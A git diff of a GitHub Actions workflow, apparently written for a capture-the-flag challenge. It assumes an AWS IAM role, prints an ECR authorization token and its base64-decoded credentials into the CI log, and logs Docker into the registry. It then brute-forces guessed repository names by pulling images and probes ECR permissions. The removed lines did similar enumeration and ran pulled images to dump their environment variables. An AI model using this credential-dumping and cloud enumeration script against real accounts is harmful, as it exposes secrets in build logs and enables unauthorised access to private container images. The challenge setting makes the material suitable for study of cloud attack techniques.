@@ -1,4 +1,4 @@
-name: Try Specific ECR Repositories
+name: Decode and Use ECR Token
 on: [push]
 
 jobs:
@@ -14,62 +14,58 @@ jobs:
           role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
           aws-region: us-east-1
           
-      - name: Try Common ECR Repository Names
+      - name: Get and Decode ECR Auth Token
         run: |
-          # Common CTF/Challenge repository names
+          echo "=== Getting ECR Authorization Token ==="
+          # Get the auth token properly
+          AUTH_DATA=$(aws ecr get-authorization-token --output json)
+          echo "Raw auth data: $AUTH_DATA"
+          
+          # Extract the token
+          AUTH_TOKEN=$(echo $AUTH_DATA | jq -r '.authorizationData[0].authorizationToken')
+          echo "Auth token: $AUTH_TOKEN"
+          
+          # Extract the proxy endpoint
+          PROXY_ENDPOINT=$(echo $AUTH_DATA | jq -r '.authorizationData[0].proxyEndpoint')
+          echo "Proxy endpoint: $PROXY_ENDPOINT"
+          
+          # Decode the base64 token
+          echo "=== Decoded token ==="
+          echo $AUTH_TOKEN | base64 -d
+          echo
+          
+      - name: Try Direct ECR Login and Search
+        run: |
+          # Get auth token and login properly
+          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com
+          
+          echo "=== Trying to discover repositories ==="
+          # Even if we can't list, try to pull common images directly
           REPOS=(
-            "imaginary-challenge"
-            "challenge"
+            "imaginary"
+            "challenge" 
             "ctf"
             "flag"
-            "secret"
             "app"
-            "web"
-            "api"
-            "backend"
-            "frontend"
-            "database"
-            "imaginary"
-            "2025-imagine"
-            "team1"
-            "empasoft"
+            "test"
+            "demo"
           )
           
           for repo in "${REPOS[@]}"; do
-            echo "=== Trying repository: $repo ==="
-            # Try to list images in the repository
-            aws ecr list-images --repository-name $repo --max-results 1 2>/dev/null && echo "✅ FOUND: $repo" || echo "❌ Not found: $repo"
+            echo "Trying: $repo"
+            # Try to pull latest tag
+            docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:latest 2>/dev/null && echo "✅ SUCCESS: Found $repo" || echo "❌ Not found: $repo"
           done
 
-      - name: If Found, Pull and Explore Images
+      - name: Check for Any Accessible Resources
         run: |
-          # If any repository worked above, pull its images
-          # Try the most likely names
-          for repo in imaginary-challenge challenge ctf flag; do
-            echo "Attempting to pull from $repo"
-            # Get available image tags
-            TAGS=$(aws ecr list-images --repository-name $repo --query 'imageIds[].imageTag' --output text 2>/dev/null)
-            if [ ! -z "$TAGS" ]; then
-              echo "Found tags in $repo: $TAGS"
-              for tag in $TAGS; do
-                echo "Pulling $repo:$tag"
-                docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:$tag
-                echo "=== Inspecting $repo:$tag ==="
-                docker images | grep $repo
-                # Try to run the image and explore
-                docker run --rm 396961015104.dkr.ecr.us-east-1.amazonaws.com/$repo:$tag env || echo "Cannot run, trying other methods"
-              done
-            fi
-          done
-
-      - name: Decode and Use ECR Auth Token
-        run: |
-          # The auth token from previous runs is base64 encoded
-          # Let's decode it and see what's inside
-          echo "=== ECR Authorization Token ==="
-          AUTH_TOKEN=$(aws ecr get-authorization-token --output text --query 'authorizationData[].authorizationToken')
-          echo "Token: $AUTH_TOKEN"
+          echo "=== Checking for other accessible AWS resources ==="
           
-          # Decode the base64 token
-          echo "$AUTH_TOKEN" | base64 -d
-          echo
+          # Try to describe any resources we might have access to
+          aws ecr describe-registry --region us-east-1 || echo "No registry describe access"
+          
+          # Try to get repository policy if any repo exists
+          aws ecr get-repository-policy --repository-name imaginary --region us-east-1 2>/dev/null && echo "✅ Has repository policy access"
+          
+          # Check if we can access any specific image by digest
+          aws ecr describe-images --repository-name imaginary --region us-east-1 2>/dev/null && echo "✅ Can describe images in 'imaginary'"
